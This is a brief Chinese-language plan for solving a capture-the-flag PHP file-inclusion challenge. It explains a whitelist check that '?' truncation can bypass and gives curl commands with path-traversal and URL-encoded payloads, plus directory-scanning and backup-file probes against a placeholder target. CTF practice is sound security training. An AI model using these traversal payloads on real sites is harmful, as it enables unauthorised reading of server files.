## 已确认: 经典 Web_php_include 题（emmm::checkFile 白名单 + ? 截断）

源码逻辑已明确:
- 白名单: source.php / hint.php
- checkFile 先查原值, 再截断第一个 `?` 前缀查, 再 urldecode 后截断 `?` 查
- 通过后 `include $_REQUEST['file']` 用的是**原始值**
- hint: "flag not here, and flag in ffffllllaaaagggg"（flag 文件名, 无扩展名）

思路, 供参考:

1. **最短路径: 直接访问 flag 文件** — 无扩展名文件 nginx 不会走 PHP 解析, 大概率当静态文件直接返回:
   ```
   curl -i http://<target>/ffffllllaaaagggg
   ```
   若直接出 flag 就结束了。若 403/404/空白再走 include。

2. **? 截断绕过**（先确认 include 对 `?` 的行为）:
   ```
   curl -i 'http://<target>/source.php?file=source.php?/../../../../../../ffffllllaaaagggg'
   ```
   观察返回内容判断行为:
   - 返回 source.php 源码 -> `?` 被 PHP 当 query 剥离了, include 只能读 source.php/hint.php
   - 返回 flag / 空白带 flag 文本 -> 路径穿越生效, 成功
   - 报错 -> `?` 被当文件名一部分, 试试下面的 urldecode 变体

3. **urldecode 分支变体**（利用第三次检查, 传 %3f 绕过）:
   ```
   curl -i 'http://<target>/source.php?file=source.php%3f/../../../../../../ffffllllaaaagggg'
   ```
   checkFile 对 urldecode 后的值截断 `?` 得 source.php 通过检查, include 原始值（含 %3f）。

4. **若确认 `?` 被剥离（include 只能读白名单文件）** — 说明 include 不是出口, 换思路:
   - ffuf 全目录扫描: 可能藏着 upload.php / admin.php / 备份文件 / flag 的其他副本
   - 直接访问 `/ffffllllaaaagggg.php` `/ffffllllaaaagggg.txt` `/flag` 等变体
   - 检查 nginx 静态文件直读: `/hint.php.bak` `/source.php.bak` `/www.zip` 等

先试 1 和 2, 看 include 行为再定下一步。
